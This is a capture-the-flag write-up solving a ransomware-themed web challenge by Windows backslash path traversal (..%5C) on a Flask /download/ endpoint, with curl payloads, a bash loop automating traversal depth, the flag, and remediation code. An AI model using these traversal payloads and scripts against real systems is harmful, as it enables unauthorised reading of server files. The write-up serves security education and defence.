# Threat Actor Support Line - CTF Writeup

**Challenge Name:** Threat Actor Support Line  
**Category:** Web Exploitation  
**Difficulty:** Easy/Medium  
**Flag:** `flag{6529440ceec226f31a3b2dc0d0b06965}`

---

## Challenge Description

> You've heard of RaaS, you've heard of SaaS... the Threat Actor Support Line brings the two together!
> Upload the files you want encrypted, and the service will start up its own hacker computer (as the Administrator user with antivirus disabled, of course) and encrypt them for you!

**Provided Information:**
- **URL:** `https://f80f4f05.proxy.coursestack.com/`
- **Token:** `f80f4f05-9391-43a8-9689-726f67620b0b_1_b9ce3237540a37589b5bcff2a1d818491f26e6c07b2767bf2049baa06e8b7cc0`

---

### UPDATED AUTOMATIC ENUMERATION
#!/bin/bash
# Complete automated CTF flag finder

TOKEN="f80f4f05-9391-43a8-9689-726f67620b0b_1_b9ce3237540a37589b5bcff2a1d818491f26e6c07b2767bf2049baa06e8b7cc0"
BASE_URL="https://f80f4f05.proxy.coursestack.com"

echo "=== Phase 1: Endpoint Discovery ==="
for endpoint in download api files static uploads result encrypted; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -H "Cookie: token=$TOKEN" "$BASE_URL/$endpoint/")
    if [ "$code" != "404" ]; then
        echo "Found endpoint: /$endpoint/ ($code)"
        
        # Phase 2: Test path traversal on this endpoint
        echo "  Testing path traversal..."
        for depth in {1..10}; do
            traversal=$(printf '..%%5C%.0s' $(seq 1 $depth))
            response=$(curl -s -w "\n%{http_code}" -H "Cookie: token=$TOKEN" \
              "$BASE_URL/$endpoint/${traversal}flag.txt")
            
            http_code=$(echo "$response" | tail -n1)
            
            if [ "$http_code" = "200" ]; then
                echo " FLAG FOUND at /$endpoint/ depth $depth!"
                echo "$response" | head -n-1
                exit 0
            fi
        done
    fi
done

echo "No flag found"

## Reconnaissance

### Step 1: Access the Main Page

First, we accessed the application using the provided authentication token:

```bash
curl -i -H "Cookie: token=f80f4f05-9391-43a8-9689-726f67620b0b_1_b9ce3237540a37589b5bcff2a1d818491f26e6c07b2767bf2049baa06e8b7cc0" https://f80f4f05.proxy.coursestack.com/
```

**Key Findings:**
- Python Flask application (`Werkzeug/2.3.7 Python/3.13.7`)
- Accepts ZIP/RAR file uploads
- Uses **WinRAR 7.12** for archive handling (Windows environment)
- Process: Extract files → Encrypt → Compress → Download
- Download functionality present in the interface

### Step 2: Analyze the Application Flow

From the FAQ section on the main page, we learned:
- Files are extracted into a **temporary directory**
- A ransom note is added
- Files are compressed back for download
- The service mentions "BLAZINGLY FAST!!!" and jokes about spending more time on the ransom note than encryption

### Step 3: Check JavaScript for API Endpoints

```bash
curl -H "Cookie: token=f80f4f05-9391-43a8-9689-726f67620b0b_1_b9ce3237540a37589b5bcff2a1d818491f26e6c07b2767bf2049baa06e8b7cc0" https://f80f4f05.proxy.coursestack.com/static/script.js
```

The JavaScript revealed:
- Form uploads POST to `/`
- File size limit: 1MB
- No explicit download endpoint revealed (generated server-side)

### Step 4: Test Upload to Discover Download Endpoint

We uploaded a simple test file to see the download mechanism:

```bash
# Create test file
echo "test content" > test.txt
zip test.zip test.txt

# Upload
curl -i -H "Cookie: token=f80f4f05-9391-43a8-9689-726f67620b0b_1_b9ce3237540a37589b5bcff2a1d818491f26e6c07b2767bf2049baa06e8b7cc0" -F "file=@test.zip" https://f80f4f05.proxy.coursestack.com/
```

**Discovery:** The response contained:
```html
<a id="downloadLink" href="/download/encrypted_test.zip" class="download-button">Download Encrypted Files</a>
```

**Download endpoint identified:** `/download/<filename>`

---

## Exploitation

### Vulnerability: Path Traversal (LFI)

With the `/download/` endpoint discovered, we tested for path traversal vulnerabilities.

#### Initial Test: Unix-style Path Traversal

```bash
curl -i -H "Cookie: token=f80f4f05-9391-43a8-9689-726f67620b0b_1_b9ce3237540a37589b5bcff2a1d818491f26e6c07b2767bf2049baa06e8b7cc0" "https://f80f4f05.proxy.coursestack.com/download/../flag.txt"
```

**Result:** `404 Not Found` - Unix-style forward slashes didn't work.

#### Windows-style Path Traversal

Since the challenge mentioned **WinRAR 7.12** (Windows), we tried backslash path traversal:

```bash
# URL-encode backslash: \ = %5C
curl -i -H "Cookie: token=f80f4f05-9391-43a8-9689-726f67620b0b_1_b9ce3237540a37589b5bcff2a1d818491f26e6c07b2767bf2049baa06e8b7cc0" "https://f80f4f05.proxy.coursestack.com/download/..%5Cflag.txt"
```

**Result:** `302 Redirect` with error "File not found!" - Path traversal works, but we need to go deeper!

#### Automated Depth Testing

Rather than manually testing each depth level, we automated the process:

```bash
for depth in {1..10}; do
    traversal=$(printf '..%%5C%.0s' $(seq 1 $depth))
    response=$(curl -s -w "\n%{http_code}" -H "Cookie: token=f80f4f05-9391-43a8-9689-726f67620b0b_1_b9ce3237540a37589b5bcff2a1d818491f26e6c07b2767bf2049baa06e8b7cc0" \
      "https://f80f4f05.proxy.coursestack.com/download/${traversal}flag.txt")
    
    http_code=$(echo "$response" | tail -n1)
    
    if [ "$http_code" = "200" ]; then
        echo "Flag found at depth $depth!"
        echo "$response" | head -n-1
        break
    fi
done
```

**Output:**
```
Flag found at depth 4!
flag{6529440ceec226f31a3b2dc0d0b06965}
```

---

## Solution Summary

### Final Exploit

```bash
curl -H "Cookie: token=f80f4f05-9391-43a8-9689-726f67620b0b_1_b9ce3237540a37589b5bcff2a1d818491f26e6c07b2767bf2049baa06e8b7cc0" \
  "https://f80f4f05.proxy.coursestack.com/download/..%5C..%5C..%5C..%5Cflag.txt"
```

**Flag:** `flag{6529440ceec226f31a3b2dc0d0b06965}`

---

## Technical Details

### Vulnerability Type
**CWE-22:** Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)

### Root Cause
The `/download/` endpoint failed to properly sanitize user input, allowing directory traversal using Windows-style backslashes (`\`). The application accepted `..%5C` sequences to navigate up the directory tree.

### Attack Chain
1. Discover `/download/` endpoint through upload functionality
2. Test for path traversal using `../` (failed - Unix style)
3. Switch to Windows path traversal using `..%5C` (backslash)
4. Automate depth testing to find correct traversal level
5. Successfully retrieve flag at 4 directory levels up

### Why It Worked
- Application runs on Windows (WinRAR 7.12 mentioned)
- Backend didn't sanitize backslash path traversal
- No whitelist validation on downloadable files
- No access control on file system paths

---

## Key Lessons Learned

### 1. **Start Simple**
Don't overcomplicate exploitation. Basic path traversal vulnerabilities are common and should be tested first.

### 2. **Read the Clues**
The challenge mentioned:
- "WinRAR 7.12" → Windows environment → Use backslashes
- "BLAZINGLY FAST!!!" → Hints at simplicity
- "Spent more time on ransom note than encryption" → Encryption isn't the focus

### 3. **Automate Repetitive Testing**
When testing similar payloads with minor variations (like traversal depth), use loops to test multiple depths automatically rather than manual testing.

### 4. **OS-Specific Exploitation**
Remember that path traversal exploits differ by operating system:
- **Unix/Linux:** Use forward slashes `/` → `../`
- **Windows:** Use backslashes `\` → `..\` (URL-encoded as `%5C`)

### 5. **Follow the Application Flow**
Understanding how the application works (upload → extract → encrypt → download) helped identify where to focus exploitation efforts.

---

## Remediation Recommendations

### For Developers

1. **Input Validation**
```python
import os
from pathlib import Path

def safe_download(filename, download_dir):
    # Resolve the absolute path
    requested_path = Path(download_dir) / filename
    safe_path = requested_path.resolve()
    
    # Ensure the path is within the allowed directory
    if not str(safe_path).startswith(str(Path(download_dir).resolve())):
        raise ValueError("Invalid file path")
    
    return safe_path
```

2. **Whitelist Allowed Files**
- Maintain a database of valid file IDs/names
- Never trust user input for file paths

3. **Use Safe File Serving Methods**
```python
from flask import send_from_directory

@app.route('/download/<path:filename>')
def download_file(filename):
    # Flask's send_from_directory has built-in protection
    return send_from_directory(
        DOWNLOAD_FOLDER, 
        filename,
        as_attachment=True
    )
```

4. **Principle of Least Privilege**
- Run the application with minimal file system permissions
- Restrict access to only necessary directories

---

## Tools Used

- `curl` - HTTP requests and file uploads
- `bash` - Scripting and automation
- Browser DevTools - Initial reconnaissance

---

## Timeline

- **T+0:00** - Accessed main page, read challenge description
- **T+0:05** - Discovered `/download/` endpoint via test upload
- **T+0:08** - Tested Unix-style path traversal (failed)
- **T+0:10** - Switched to Windows-style backslash traversal
- **T+0:12** - Automated depth testing
- **T+0:13** - Retrieved flag at depth 4

**Total Time:** ~13 minutes

---

## References

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [Flask Security Best Practices](https://flask.palletsprojects.com/en/latest/security/)
- [URL Encoding Reference](https://www.w3schools.com/tags/ref_urlencode.asp)

---

## Conclusion

The "Threat Actor Support Line" challenge was a straightforward path traversal vulnerability disguised as a ransomware service. The key to success was:

1. **Systematic enumeration** to discover the `/download/` endpoint
2. **Reading environmental clues** (WinRAR = Windows)
3. **Testing OS-specific path traversal** techniques
4. **Automating depth testing** for efficiency

The challenge reinforced the importance of starting with simple, common vulnerabilities before attempting complex exploitation techniques. Path traversal remains one of the most prevalent web vulnerabilities and should always be in a security tester's initial checklist.

---

*Challenge solved by: bwallace*  
*Date: October 16, 2025*  
*Category: Web Exploitation*